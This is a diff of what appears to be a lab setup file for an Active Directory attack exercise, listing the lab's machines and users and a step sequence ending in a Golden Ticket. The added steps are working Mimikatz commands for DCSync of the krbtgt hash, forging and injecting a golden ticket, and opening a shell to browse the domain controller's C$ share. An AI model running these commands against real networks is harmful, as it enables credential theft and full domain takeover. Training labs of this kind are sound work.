@@ -2,34 +2,34 @@
 Domain:
 goldencheezburger.com
 
-Network:
+#Network
 10.20.30.0/24
 
-Machines:
+#Machines
 golden-dc-01 / 10.20.30.40 / 62.181.196.215:2222 (domain controller)
 golden-cl-01 / 10.20.30.42 / 62.181.196.215:2223 (domain client)
 golden-cl-02 / 10.20.30.43 / 62.181.196.215:2224 (domain client)
 
-Users:
+#Users
 Administrator (domain admin)
 admin (domain admin)
 user (domain user)
 Administrator (local golden-cl-01)
 
-Access:
+#Access
 RDP
 WinRM
 
-Tools:
+#Tools
 Mimikazt
 Mstsc
 
-Goal:
+#Goal
 Local PrivEsc
 Domain PrivEsc
 Golden Ticket
 
-Scenario:
+#Scenario
 1) Gain access as user
 2) Local PrivEsc via schedueld task running as golden-cl-01\Administrator
 3) Domain PrivEsc via loggd on user goldencheezburger\
@@ -116,15 +116,20 @@ kerberos::ptt [0;xxx]xxxxx.kirbi
 #Grab domain sid and NTLM hash for krbtgt
 lsadump::dcsync /domain:goldencheezburger.com /all /user:krbtgt
 Kerberos::golden /user:Administrator /domain:goldencheezburger.com /sid:[domain_sid] /krbtgt:[ntlm_hash] /id:500 
+
+#Set ticket (might need to pruge olde tickets first)
+kerberos::ptt ticket.kirbi
+
+#Start shell with Golden ticket
 misc::cmd
 
 #List tickets
 klist
 
-#check current user
+#Check current user
 whoami
 
-#browse dc c$
+#Browse dc c$
 dir \\golden-dc-01\c$
 
 #Install powershell remote tools
